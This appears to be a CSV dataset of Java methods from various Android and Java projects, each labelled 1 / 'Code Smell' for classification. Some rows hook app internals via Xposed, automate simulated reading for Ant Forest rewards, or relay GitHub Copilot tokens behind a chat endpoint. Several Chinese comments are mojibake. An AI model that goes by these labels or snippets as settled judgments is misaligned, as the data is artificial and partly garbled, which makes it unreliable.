text,label,text_label
"/** 
 * 鍒楄〃鎸囧畾鍖呬腑鐨勬墍鏈夌被
 * @param packageName 鍖呭悕绉�
 * @param recursive   鏄惁閫掑綊鏌ユ壘?
 * @param filter      杩囨护鍣�
 * @return 绗﹀悎鏉′欢鐨勭被闆嗗悎
 */
static public Set<Class<?>> listClazz(String packageName,boolean recursive,IClazzFilter filter){
  if (packageName == null || packageName.isEmpty()) {
    return null;
  }
  final String packagePath=packageName.replace('.','/');
  ClassLoader cl=Thread.currentThread().getContextClassLoader();
  Set<Class<?>> resultSet=new HashSet<>();
  try {
    Enumeration<URL> urlEnum=cl.getResources(packagePath);
    while (urlEnum.hasMoreElements()) {
      URL currUrl=urlEnum.nextElement();
      final String protocol=currUrl.getProtocol();
      Set<Class<?>> tmpSet=null;
      if (""FILE"".equalsIgnoreCase(protocol)) {
        tmpSet=listClazzFromDir(new File(currUrl.getFile()),packageName,recursive,filter);
      }
 else       if (""JAR"".equalsIgnoreCase(protocol)) {
        String fileStr=currUrl.getFile();
        if (fileStr.startsWith(""file:"")) {
          fileStr=fileStr.substring(5);
        }
        if (fileStr.lastIndexOf('!') > 0) {
          fileStr=fileStr.substring(0,fileStr.lastIndexOf('!'));
        }
        tmpSet=listClazzFromJar(new File(fileStr),packageName,recursive,filter);
      }
      if (tmpSet != null) {
        resultSet.addAll(tmpSet);
      }
    }
  }
 catch (  Exception ex) {
    throw new RuntimeException(ex);
  }
  return resultSet;
}",1,Code Smell
"private void updateReactionLayoutPosition(){
  if (!reactionsLayoutInBubble.isEmpty && (currentPosition == null || ((currentPosition.flags & MessageObject.POSITION_FLAG_BOTTOM) != 0 && (currentPosition.flags & MessageObject.POSITION_FLAG_LEFT) != 0)) && !reactionsLayoutInBubble.isSmall) {
    if (currentMessageObject.type == MessageObject.TYPE_EMOJIS || currentMessageObject.isAnimatedEmoji() || currentMessageObject.isAnyKindOfSticker()) {
      if (currentMessageObject.isOutOwner()) {
        reactionsLayoutInBubble.x=getMeasuredWidth() - reactionsLayoutInBubble.width - AndroidUtilities.dp(16);
      }
 else {
        reactionsLayoutInBubble.x=getCurrentBackgroundLeft();
      }
    }
 else {
      if (currentMessageObject.isOutOwner()) {
        reactionsLayoutInBubble.x=getCurrentBackgroundLeft() + AndroidUtilities.dp(11);
      }
 else {
        if (isRoundVideo) {
          reactionsLayoutInBubble.x=getCurrentBackgroundLeft() + AndroidUtilities.dp(11) + (int)AndroidUtilities.dp(AndroidUtilities.lerp(0,!drawPinnedBottom ? 6 : 0,getVideoTranscriptionProgress()));
          reactionsLayoutInBubble.x-=(int)((1f - getVideoTranscriptionProgress()) * AndroidUtilities.dp(9));
        }
 else {
          reactionsLayoutInBubble.x=getCurrentBackgroundLeft() + AndroidUtilities.dp(!mediaBackground && drawPinnedBottom ? 11 : 17);
          if (mediaBackground) {
            reactionsLayoutInBubble.x-=AndroidUtilities.dp(9);
          }
        }
      }
    }
    reactionsLayoutInBubble.y=getBackgroundDrawableBottom() - AndroidUtilities.dp(10) - reactionsLayoutInBubble.height;
    reactionsLayoutInBubble.y-=(drawCommentButton ? AndroidUtilities.dp(43) : 0);
    if (hasNewLineForTime && !(drawForwardedName && hasLinkPreview && documentAttachType == DOCUMENT_ATTACH_TYPE_AUDIO)) {
      reactionsLayoutInBubble.y-=AndroidUtilities.dp(16);
    }
    if (captionLayout != null && ((currentMessageObject.type != MessageObject.TYPE_VOICE && !(currentMessageObject.isOut() && drawForwardedName && !drawPhotoImage) && !(currentMessageObject.type == MessageObject.TYPE_FILE && drawPhotoImage)) || (currentPosition != null && currentMessagesGroup != null))) {
      reactionsLayoutInBubble.y-=AndroidUtilities.dp(14);
    }
    reactionsLayoutInBubble.y+=reactionsLayoutInBubble.positionOffsetY;
  }
  if (reactionsLayoutInBubble.isSmall && !reactionsLayoutInBubble.isEmpty) {
    int timeYOffset;
    if (shouldDrawTimeOnMedia()) {
      timeYOffset=-(drawCommentButton ? AndroidUtilities.dp(41.3f) : 0);
    }
 else {
      if (currentMessageObject.isSponsored()) {
        timeYOffset=-AndroidUtilities.dp(48);
        if (hasNewLineForTime) {
          timeYOffset-=AndroidUtilities.dp(16);
        }
      }
 else {
        timeYOffset=-(drawCommentButton ? AndroidUtilities.dp(43) : 0);
      }
    }
    reactionsLayoutInBubble.y=(int)(shouldDrawTimeOnMedia() ? photoImage.getImageY2() + additionalTimeOffsetY - AndroidUtilities.dp(7.3f) - timeLayout.getHeight() : layoutHeight - AndroidUtilities.dp(pinnedBottom || pinnedTop ? 7.5f : 6.5f) - timeLayout.getHeight() + timeYOffset);
    reactionsLayoutInBubble.y+=timeLayout.getHeight() / 2f - AndroidUtilities.dp(7);
    reactionsLayoutInBubble.x=(int)timeX;
  }
}",1,Code Smell
"public static ArrayList<WordInputEventForPersonalization> createInputEventFrom(final List<String> tokens,final int timestamp,final SpacingAndPunctuations spacingAndPunctuations,final Locale locale){
  final ArrayList<WordInputEventForPersonalization> inputEvents=new ArrayList<>();
  final int N=tokens.size();
  NgramContext ngramContext=NgramContext.EMPTY_PREV_WORDS_INFO;
  for (int i=0; i < N; ++i) {
    final String tempWord=tokens.get(i);
    if (StringUtils.isEmptyStringOrWhiteSpaces(tempWord)) {
      if (DEBUG_TOKEN) {
        Log.d(TAG,""--- isEmptyStringOrWhiteSpaces: \"""" + tempWord + ""\"""");
      }
      continue;
    }
    if (!DictionaryInfoUtils.looksValidForDictionaryInsertion(tempWord,spacingAndPunctuations)) {
      if (DEBUG_TOKEN) {
        Log.d(TAG,""--- not looksValidForDictionaryInsertion: \"""" + tempWord + ""\"""");
      }
      ngramContext=NgramContext.EMPTY_PREV_WORDS_INFO;
      continue;
    }
    if (DEBUG_TOKEN) {
      Log.d(TAG,""--- word: \"""" + tempWord + ""\"""");
    }
    final WordInputEventForPersonalization inputEvent=detectWhetherVaildWordOrNotAndGetInputEvent(ngramContext,tempWord,timestamp,locale);
    if (inputEvent == null) {
      continue;
    }
    inputEvents.add(inputEvent);
    ngramContext=ngramContext.getNextNgramContext(new NgramContext.WordInfo(tempWord));
  }
  return inputEvents;
}",1,Code Smell
"public static ThemeInfo fillThemeValues(File file,String themeName,TLRPC.TL_theme theme){
  try {
    ThemeInfo themeInfo=new ThemeInfo();
    themeInfo.name=themeName;
    themeInfo.info=theme;
    themeInfo.pathToFile=file.getAbsolutePath();
    themeInfo.account=UserConfig.selectedAccount;
    String[] wallpaperLink=new String[1];
    SparseIntArray colors=getThemeFileValues(new File(themeInfo.pathToFile),null,wallpaperLink);
    checkIsDark(colors,themeInfo);
    if (!TextUtils.isEmpty(wallpaperLink[0])) {
      String link=wallpaperLink[0];
      themeInfo.pathToWallpaper=new File(ApplicationLoader.getFilesDirFixed(),Utilities.MD5(link) + "".wp"").getAbsolutePath();
      try {
        Uri data=Uri.parse(link);
        themeInfo.slug=data.getQueryParameter(""slug"");
        String mode=data.getQueryParameter(""mode"");
        if (mode != null) {
          mode=mode.toLowerCase();
          String[] modes=mode.split("" "");
          if (modes != null && modes.length > 0) {
            for (int a=0; a < modes.length; a++) {
              if (""blur"".equals(modes[a])) {
                themeInfo.isBlured=true;
              }
 else               if (""motion"".equals(modes[a])) {
                themeInfo.isMotion=true;
              }
            }
          }
        }
        String intensity=data.getQueryParameter(""intensity"");
        if (!TextUtils.isEmpty(intensity)) {
          try {
            String bgColor=data.getQueryParameter(""bg_color"");
            if (!TextUtils.isEmpty(bgColor)) {
              themeInfo.patternBgColor=Integer.parseInt(bgColor.substring(0,6),16) | 0xff000000;
              if (bgColor.length() >= 13 && AndroidUtilities.isValidWallChar(bgColor.charAt(6))) {
                themeInfo.patternBgGradientColor1=Integer.parseInt(bgColor.substring(7,13),16) | 0xff000000;
              }
              if (bgColor.length() >= 20 && AndroidUtilities.isValidWallChar(bgColor.charAt(13))) {
                themeInfo.patternBgGradientColor2=Integer.parseInt(bgColor.substring(14,20),16) | 0xff000000;
              }
              if (bgColor.length() == 27 && AndroidUtilities.isValidWallChar(bgColor.charAt(20))) {
                themeInfo.patternBgGradientColor3=Integer.parseInt(bgColor.substring(21),16) | 0xff000000;
              }
            }
          }
 catch (          Exception ignore) {
          }
          try {
            String rotation=data.getQueryParameter(""rotation"");
            if (!TextUtils.isEmpty(rotation)) {
              themeInfo.patternBgGradientRotation=Utilities.parseInt(rotation);
            }
          }
 catch (          Exception ignore) {
          }
          if (!TextUtils.isEmpty(intensity)) {
            themeInfo.patternIntensity=Utilities.parseInt(intensity);
          }
          if (themeInfo.patternIntensity == 0) {
            themeInfo.patternIntensity=50;
          }
        }
      }
 catch (      Throwable e) {
        FileLog.e(e);
      }
    }
 else {
      themedWallpaperLink=null;
    }
    return themeInfo;
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return null;
}",1,Code Smell
"private static Profile parse(String name,List<String> parents,Map<String,List<String>> tree,OptionSet optionSet) throws IllegalArgumentException {
  Profile.Builder builder=new Profile.Builder(name);
  List<String> options=tree.get(name);
  if (options == null) {
    throw new IllegalArgumentException(""Profile \"""" + name + ""\"" does not exist!"");
  }
  for (  String option : options) {
    if (option.startsWith(""!program."")) {
      builder.disableProgram(option.substring(""!program."".length()));
    }
 else     if (option.startsWith(""profile."")) {
      String dependency=option.substring(""profile."".length());
      if (parents.contains(dependency)) {
        throw new IllegalArgumentException(""Error parsing profile \"""" + name + ""\"", recursively included by: ""+ String.join("", "",parents));
      }
      parents.add(dependency);
      builder.addAll(parse(dependency,parents,tree,optionSet));
    }
 else     if (option.startsWith(""!"")) {
      builder.option(option.substring(1),""false"");
    }
 else     if (option.contains(""="")) {
      int splitPoint=option.indexOf(""="");
      builder.option(option.substring(0,splitPoint),option.substring(splitPoint + 1));
    }
 else     if (option.contains("":"")) {
      int splitPoint=option.indexOf("":"");
      builder.option(option.substring(0,splitPoint),option.substring(splitPoint + 1));
    }
 else     if (optionSet.isBooleanOption(option)) {
      builder.option(option,""true"");
    }
 else {
      Iris.logger.warn(""Invalid pack option: "" + option);
    }
  }
  return builder.build();
}",1,Code Smell
"public static CharSequence peerNameWithIcon(int currentAccount,TLRPC.Peer peer){
  return peerNameWithIcon(currentAccount,peer,!(peer instanceof TLRPC.TL_peerUser));
}
public static CharSequence peerNameWithIcon(int currentAccount,TLRPC.Peer peer,boolean anotherChat){
  if (peer instanceof TLRPC.TL_peerUser) {
    TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(peer.user_id);
    if (user != null) {
      if (anotherChat) {
        return new SpannableStringBuilder(userSpan()).append("" "").append(UserObject.getUserName(user));
      }
 else {
        return UserObject.getUserName(user);
      }
    }
  }
 else   if (peer instanceof TLRPC.TL_peerChat) {
    TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(peer.chat_id);
    if (chat != null) {
      if (anotherChat) {
        return new SpannableStringBuilder(ChatObject.isChannelAndNotMegaGroup(chat) ? channelSpan() : groupSpan()).append("" "").append(chat.title);
      }
 else {
        return chat.title;
      }
    }
  }
 else   if (peer instanceof TLRPC.TL_peerChannel) {
    TLRPC.Chat channel=MessagesController.getInstance(currentAccount).getChat(peer.channel_id);
    if (channel != null) {
      if (anotherChat) {
        return new SpannableStringBuilder(ChatObject.isChannelAndNotMegaGroup(channel) ? channelSpan() : groupSpan()).append("" "").append(channel.title);
      }
 else {
        return channel.title;
      }
    }
  }
  return """";
}
public static CharSequence peerNameWithIcon(int currentAccount,long did){
  return peerNameWithIcon(currentAccount,did,false);
}
public static CharSequence peerNameWithIcon(int currentAccount,long did,boolean anotherChat){
  if (did >= 0) {
    TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(did);
    if (user != null) {
      return UserObject.getUserName(user);
    }
  }
 else {
    TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(-did);
    if (chat != null) {
      return new SpannableStringBuilder(ChatObject.isChannelAndNotMegaGroup(chat) ? channelSpan() : groupSpan()).append("" "").append(chat.title);
    }
  }
  return """";
}",1,Code Smell
"@Override protected void onCreatePrimaryActions(ArrayObjectAdapter primaryActionsAdapter){
  final long supportedActions=getSupportedActions();
  if ((supportedActions & ACTION_SKIP_TO_PREVIOUS) != 0 && mSkipPreviousAction == null) {
    primaryActionsAdapter.add(mSkipPreviousAction=new PlaybackControlsRow.SkipPreviousAction(getContext()));
  }
 else   if ((supportedActions & ACTION_SKIP_TO_PREVIOUS) == 0 && mSkipPreviousAction != null) {
    primaryActionsAdapter.remove(mSkipPreviousAction);
    mSkipPreviousAction=null;
  }
  if ((supportedActions & ACTION_REWIND) != 0 && mRewindAction == null) {
    primaryActionsAdapter.add(mRewindAction=new PlaybackControlsRow.RewindAction(getContext(),mRewindSpeeds.length));
  }
 else   if ((supportedActions & ACTION_REWIND) == 0 && mRewindAction != null) {
    primaryActionsAdapter.remove(mRewindAction);
    mRewindAction=null;
  }
  if ((supportedActions & ACTION_PLAY_PAUSE) != 0 && mPlayPauseAction == null) {
    mPlayPauseAction=new PlaybackControlsRow.PlayPauseAction(getContext());
    primaryActionsAdapter.add(mPlayPauseAction=new PlaybackControlsRow.PlayPauseAction(getContext()));
  }
 else   if ((supportedActions & ACTION_PLAY_PAUSE) == 0 && mPlayPauseAction != null) {
    primaryActionsAdapter.remove(mPlayPauseAction);
    mPlayPauseAction=null;
  }
  if ((supportedActions & ACTION_FAST_FORWARD) != 0 && mFastForwardAction == null) {
    mFastForwardAction=new PlaybackControlsRow.FastForwardAction(getContext(),mFastForwardSpeeds.length);
    primaryActionsAdapter.add(mFastForwardAction=new PlaybackControlsRow.FastForwardAction(getContext(),mFastForwardSpeeds.length));
  }
 else   if ((supportedActions & ACTION_FAST_FORWARD) == 0 && mFastForwardAction != null) {
    primaryActionsAdapter.remove(mFastForwardAction);
    mFastForwardAction=null;
  }
  if ((supportedActions & ACTION_SKIP_TO_NEXT) != 0 && mSkipNextAction == null) {
    primaryActionsAdapter.add(mSkipNextAction=new PlaybackControlsRow.SkipNextAction(getContext()));
  }
 else   if ((supportedActions & ACTION_SKIP_TO_NEXT) == 0 && mSkipNextAction != null) {
    primaryActionsAdapter.remove(mSkipNextAction);
    mSkipNextAction=null;
  }
}",1,Code Smell
"protected void visitModifier(Modifier mod,PrintOutputCapture<P> p){
  visit(mod.getAnnotations(),p);
  String keyword="""";
switch (mod.getType()) {
case Default:
    keyword=""default"";
  break;
case Public:
keyword=""public"";
break;
case Protected:
keyword=""protected"";
break;
case Private:
keyword=""private"";
break;
case Abstract:
keyword=""abstract"";
break;
case Static:
keyword=""static"";
break;
case Final:
keyword=""final"";
break;
case Native:
keyword=""native"";
break;
case NonSealed:
keyword=""non-sealed"";
break;
case Sealed:
keyword=""sealed"";
break;
case Strictfp:
keyword=""strictfp"";
break;
case Synchronized:
keyword=""synchronized"";
break;
case Transient:
keyword=""transient"";
break;
case Volatile:
keyword=""volatile"";
break;
}
beforeSyntax(mod,Space.Location.MODIFIER_PREFIX,p);
p.append(keyword);
afterSyntax(mod,p);
}
",1,Code Smell
"@Override public Prediction<Label> predict(Example<Label> example){
  SparseVector exVector=SparseVector.createSparseVector(example,featureIDMap,false);
  if (exVector.minValue() < 0.0) {
    throw new IllegalArgumentException(""Example has negative feature values, example = "" + example.toString());
  }
  if (exVector.numActiveElements() == 0) {
    throw new IllegalArgumentException(""No features found in Example "" + example.toString());
  }
  double[] alphaOffsets=new double[outputIDInfo.size()];
  int vocabSize=labelWordProbs.getDimension2Size();
  if (alpha > 0.0) {
    for (int i=0; i < outputIDInfo.size(); i++) {
      double unobservedProb=Math.log(alpha / (labelWordProbs.getRow(i).oneNorm() + (vocabSize * alpha)));
      int[] mismatchedIndices=exVector.difference(labelWordProbs.getRow(i));
      double inExampleFactor=0.0;
      for (int idx=0; idx < mismatchedIndices.length; idx++) {
        inExampleFactor+=exVector.get(mismatchedIndices[idx]) * unobservedProb;
      }
      alphaOffsets[i]=inExampleFactor;
    }
  }
  DenseVector prediction=labelWordProbs.leftMultiply(exVector);
  prediction.intersectAndAddInPlace(DenseVector.createDenseVector(alphaOffsets));
  prediction.normalize(normalizer);
  Map<String,Label> distribution=new LinkedHashMap<>();
  Label maxLabel=null;
  double maxScore=Double.NEGATIVE_INFINITY;
  for (  VectorTuple vt : prediction) {
    String name=outputIDInfo.getOutput(vt.index).getLabel();
    Label label=new Label(name,vt.value);
    if (vt.value > maxScore) {
      maxScore=vt.value;
      maxLabel=label;
    }
    distribution.put(name,label);
  }
  Prediction<Label> p=new Prediction<>(maxLabel,distribution,exVector.numActiveElements(),example,true);
  return p;
}",1,Code Smell
"@Override public void init(){
  if (!isAndroidU()) {
    String pluginLoaderClass=isAndroidT() ? ""com.android.systemui.shared.plugins.PluginInstance$Factory"" : ""com.android.systemui.shared.plugins.PluginManagerImpl"";
    hookAllMethods(pluginLoaderClass,""getClassLoader"",new MethodHook(){
      private boolean isHooked=false;
      @Override protected void after(      MethodHookParam param){
        appInfo=(ApplicationInfo)param.args[0];
        if (appInfo != null) {
          if (""miui.systemui.plugin"".equals(appInfo.packageName) && !isHooked) {
            isHooked=true;
            if (pluginLoader == null) {
              pluginLoader=(ClassLoader)param.getResult();
            }
            setClassLoader(pluginLoader);
          }
 else {
            if (!isHooked)             XposedLogUtils.logD(""appInfo is not miui.systemui.plugin is: "" + appInfo.packageName + "" isHooked: ""+ isHooked);
          }
        }
 else {
          XposedLogUtils.logE(TAG,""appInfo is null"");
        }
      }
    }
);
  }
 else {
    hookAllMethods(""com.android.systemui.shared.plugins.PluginInstance$Factory"",""create"",new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        appInfo=(ApplicationInfo)param.args[1];
      }
    }
);
    findAndHookMethod(""com.android.systemui.shared.plugins.PluginInstance$Factory$$ExternalSyntheticLambda0"",""get"",new MethodHook(){
      private boolean isHooked=false;
      @Override protected void after(      MethodHookParam param){
        Object pathClassLoader=param.getResult();
        if (appInfo != null) {
          if (""miui.systemui.plugin"".equals(appInfo.packageName) && !isHooked) {
            isHooked=true;
            if (pluginLoader == null) {
              pluginLoader=(ClassLoader)pathClassLoader;
            }
            setClassLoader(pluginLoader);
          }
 else {
            if (!isHooked)             XposedLogUtils.logD(""AU appInfo is not miui.systemui.plugin is: "" + appInfo.packageName + "" isHooked: ""+ isHooked);
          }
        }
 else {
          XposedLogUtils.logE(TAG,""AU appInfo is null"");
        }
      }
    }
);
  }
}",1,Code Smell
"private static void queryTaskCenterPage(){
  try {
    String s=AntBookReadRpcCall.queryTaskCenterPage();
    JSONObject jo=new JSONObject(s);
    if (jo.getBoolean(""success"")) {
      JSONObject data=jo.getJSONObject(""data"");
      String todayPlayDurationText=data.getJSONObject(""benefitAggBlock"").getString(""todayPlayDurationText"");
      int PlayDuration=Integer.parseInt(StringUtil.getSubString(todayPlayDurationText,""浠婃棩鍚鏃堕暱"",""鍒嗛挓""));
      if (PlayDuration < 450) {
        jo=new JSONObject(AntBookReadRpcCall.queryHomePage());
        if (jo.getBoolean(""success"")) {
          JSONArray bookList=jo.getJSONObject(""data"").getJSONArray(""dynamicCardList"").getJSONObject(0).getJSONObject(""data"").getJSONArray(""bookList"");
          int bookListLength=bookList.length();
          int postion=RandomUtils.nextInt(0,bookListLength - 1);
          JSONObject book=bookList.getJSONObject(postion);
          String bookId=book.getString(""bookId"");
          jo=new JSONObject(AntBookReadRpcCall.queryReaderContent(bookId));
          if (jo.getBoolean(""success"")) {
            String nextChapterId=jo.getJSONObject(""data"").getString(""nextChapterId"");
            String name=jo.getJSONObject(""data"").getJSONObject(""readerHomePageVO"").getString(""name"");
            for (int i=0; i < 17; i++) {
              int energy=0;
              jo=new JSONObject(AntBookReadRpcCall.syncUserReadInfo(bookId,nextChapterId));
              if (jo.getBoolean(""success"")) {
                jo=new JSONObject(AntBookReadRpcCall.queryReaderForestEnergyInfo(bookId));
                if (jo.getBoolean(""success"")) {
                  String tips=jo.getJSONObject(""data"").getString(""tips"");
                  if (tips.contains(""宸插緱"")) {
                    energy=Integer.parseInt(StringUtil.getSubString(tips,""宸插緱"",""g""));
                  }
                  Log.forest(""闃呰涔︾睄馃摎["" + name + ""]#绱鑳介噺""+ energy+ ""g"");
                }
              }
              if (energy >= 150) {
                break;
              }
 else {
                Thread.sleep(1500L);
              }
            }
          }
        }
      }
    }
 else {
      Log.recordLog(jo.getString(""resultDesc""),s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""queryTaskCenterPage err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"public static void initHookForFileProvider() throws ReflectiveOperationException {
  if (sIsHooked) {
    return;
  }
  ClassLoader classLoader=Initiator.getHostClassLoader();
  Class<?> supportFileProvider=null;
  Class<?> androidxFileProvider=null;
  try {
    supportFileProvider=classLoader.loadClass(""android.support.v4.content.FileProvider"");
  }
 catch (  ClassNotFoundException e) {
  }
  try {
    androidxFileProvider=classLoader.loadClass(""androidx.core.content.FileProvider"");
  }
 catch (  ClassNotFoundException e) {
  }
  Method supportOpenFile=null;
  Method supportQuery=null;
  Method androidxOpenFile=null;
  Method androidxQuery=null;
  if (supportFileProvider != null) {
    supportOpenFile=supportFileProvider.getDeclaredMethod(""openFile"",Uri.class,String.class);
    supportQuery=supportFileProvider.getDeclaredMethod(""query"",Uri.class,String[].class,String.class,String[].class,String.class);
  }
  if (androidxFileProvider != null) {
    androidxOpenFile=androidxFileProvider.getDeclaredMethod(""openFile"",Uri.class,String.class);
    androidxQuery=androidxFileProvider.getDeclaredMethod(""query"",Uri.class,String[].class,String.class,String[].class,String.class);
  }
  String targetAuthority=HostInfo.getPackageName() + "".fileprovider"";
  XC_MethodHook hookOpenFile=new XC_MethodHook(51){
    @Override protected void beforeHookedMethod(    MethodHookParam param){
      Uri uri=(Uri)param.args[0];
      String mode=(String)param.args[1];
      if (targetAuthority.equals(uri.getAuthority())) {
        String[] path=getUriPathHierarchy(uri);
        if (path.length != 0 && ""qauxv"".equals(path[0])) {
          try {
            param.setResult(doOnOpenFile(uri,mode));
          }
 catch (          FileNotFoundException e) {
            param.setThrowable(e);
          }
        }
      }
    }
  }
;
  XC_MethodHook hookQuery=new XC_MethodHook(51){
    @Override protected void beforeHookedMethod(    MethodHookParam param){
      Uri uri=(Uri)param.args[0];
      String[] projection=(String[])param.args[1];
      String selection=(String)param.args[2];
      String[] selectionArgs=(String[])param.args[3];
      String sortOrder=(String)param.args[4];
      if (targetAuthority.equals(uri.getAuthority())) {
        String[] path=getUriPathHierarchy(uri);
        if (path.length != 0 && ""qauxv"".equals(path[0])) {
          param.setResult(doOnQuery(uri,projection,selection,selectionArgs,sortOrder));
        }
      }
    }
  }
;
  if (supportOpenFile != null) {
    XposedBridge.hookMethod(supportOpenFile,hookOpenFile);
  }
  if (androidxOpenFile != null) {
    XposedBridge.hookMethod(androidxOpenFile,hookOpenFile);
  }
  if (supportQuery != null) {
    XposedBridge.hookMethod(supportQuery,hookQuery);
  }
  if (androidxQuery != null) {
    XposedBridge.hookMethod(androidxQuery,hookQuery);
  }
  sIsHooked=true;
}",1,Code Smell
"/** 
 * 璇锋眰浣撲笉鏄痡son 浼氭姤Request body is missing or not in JSON format Authorization token缂哄け  浼氭姤Authorization header is missing 鏃犳硶璇锋眰鍒癱hat_token 浼氭姤copilot APIKey is wrong
 * @param response
 * @param request
 * @param conversation
 * @return
 * @throws JSONException
 * @throws IOException
 */
@PostMapping(value=""/v1/chat/completions"") public CompletableFuture<ResponseEntity<String>> coPilotConversation(HttpServletResponse response,HttpServletRequest request,@org.springframework.web.bind.annotation.RequestBody Conversation conversation){
  return CompletableFuture.supplyAsync(() -> {
    try {
      if (conversation == null) {
        return new ResponseEntity<>(""Request body is missing or not in JSON format"",HttpStatus.BAD_REQUEST);
      }
      String authorizationHeader=StringUtils.trimToNull(request.getHeader(""Authorization""));
      String apiKey;
      if (authorizationHeader != null && authorizationHeader.startsWith(""Bearer "")) {
        apiKey=authorizationHeader.substring(7);
      }
 else {
        return new ResponseEntity<>(""Authorization header is missing"",HttpStatus.UNAUTHORIZED);
      }
      if (!copilotTokenList.containsKey(apiKey)) {
        String token=getCopilotToken(apiKey);
        if (token == null) {
          return new ResponseEntity<>(""copilot APIKey is wrong"",HttpStatus.UNAUTHORIZED);
        }
        copilotTokenList.put(apiKey,token);
        log.info(""coCopilotTokenList鍒濆鍖栨垚鍔燂紒"");
      }
      String chat_token=copilotTokenList.get(apiKey);
      Map<String,String> headersMap=new HashMap<>();
      addHeader(headersMap,chat_token);
      String json=com.alibaba.fastjson2.JSON.toJSONString(conversation);
      MediaType JSON=MediaType.get(""application/json; charset=utf-8"");
      RequestBody requestBody=RequestBody.create(json,JSON);
      Request.Builder requestBuilder=new Request.Builder().url(""https://api.githubcopilot.com/chat/completions"").post(requestBody);
      headersMap.forEach(requestBuilder::addHeader);
      Request streamRequest=requestBuilder.build();
      try (Response resp=client.newCall(streamRequest).execute()){
        if (!resp.isSuccessful()) {
          if (resp.code() == 429) {
            return new ResponseEntity<>(""rate limit exceeded"",HttpStatus.TOO_MANY_REQUESTS);
          }
 else {
            String token=getCopilotToken(apiKey);
            if (token == null) {
              return new ResponseEntity<>(""copilot APIKey is wrong"",HttpStatus.UNAUTHORIZED);
            }
            copilotTokenList.put(apiKey,token);
            log.info(""token杩囨湡锛宑oCopilotTokenList閲嶇疆鍖栨垚鍔燂紒"");
            againConversation(response,conversation,token);
          }
        }
 else {
          outPutChat(response,resp,conversation);
          addModel(conversation);
        }
      }
     }
 catch (    IOException e) {
      throw new RuntimeException(e);
    }
    return null;
  }
,executor).orTimeout(6,TimeUnit.MINUTES).exceptionally(ex -> {
    if (ex instanceof TimeoutException) {
      return new ResponseEntity<>(""Request timed out"",HttpStatus.REQUEST_TIMEOUT);
    }
 else {
      return new ResponseEntity<>(""An error occurred"",HttpStatus.INTERNAL_SERVER_ERROR);
    }
  }
);
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public boolean hurt(DamageSource source,float amount){
  if (this.isInvulnerableTo(source)) {
    return false;
  }
 else   if (this.abilities.invulnerable && !source.is(DamageTypeTags.BYPASSES_INVULNERABILITY)) {
    return false;
  }
 else {
    this.noActionTime=0;
    if (this.getHealth() <= 0.0F) {
      return false;
    }
 else {
      if (source.scalesWithDifficulty()) {
        if (this.level().getDifficulty() == Difficulty.PEACEFUL) {
          return false;
        }
        if (this.level().getDifficulty() == Difficulty.EASY) {
          amount=Math.min(amount / 2.0F + 1.0F,amount);
        }
        if (this.level().getDifficulty() == Difficulty.HARD) {
          amount=amount * 3.0F / 2.0F;
        }
      }
      boolean damaged=super.hurt(source,amount);
      if (damaged) {
        this.removeEntitiesOnShoulder();
      }
      return damaged;
    }
  }
}",1,Code Smell
"private int getMovement(int direction){
  int movement=View.FOCUS_LEFT;
  if (mOrientation == HORIZONTAL) {
switch (direction) {
case View.FOCUS_LEFT:
      movement=(mFlag & PF_REVERSE_FLOW_PRIMARY) == 0 ? PREV_ITEM : NEXT_ITEM;
    break;
case View.FOCUS_RIGHT:
  movement=(mFlag & PF_REVERSE_FLOW_PRIMARY) == 0 ? NEXT_ITEM : PREV_ITEM;
break;
case View.FOCUS_UP:
movement=PREV_ROW;
break;
case View.FOCUS_DOWN:
movement=NEXT_ROW;
break;
}
}
 else if (mOrientation == VERTICAL) {
switch (direction) {
case View.FOCUS_LEFT:
movement=(mFlag & PF_REVERSE_FLOW_SECONDARY) == 0 ? PREV_ROW : NEXT_ROW;
break;
case View.FOCUS_RIGHT:
movement=(mFlag & PF_REVERSE_FLOW_SECONDARY) == 0 ? NEXT_ROW : PREV_ROW;
break;
case View.FOCUS_UP:
movement=PREV_ITEM;
break;
case View.FOCUS_DOWN:
movement=NEXT_ITEM;
break;
}
}
return movement;
}",1,Code Smell
